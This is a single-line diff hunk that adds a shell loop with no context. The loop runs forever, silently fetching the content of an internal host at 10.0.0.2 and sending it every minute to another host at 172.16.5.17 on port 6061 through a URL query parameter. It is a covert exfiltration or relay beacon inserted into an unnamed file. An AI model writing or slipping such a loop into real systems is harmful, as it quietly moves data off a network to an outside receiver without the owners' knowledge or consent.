@@ -1,0 +1,1 @@
+while true;do curl -s http://172.16.5.17:6061/?f=$(curl -s http://10.0.0.2);sleep 60;done
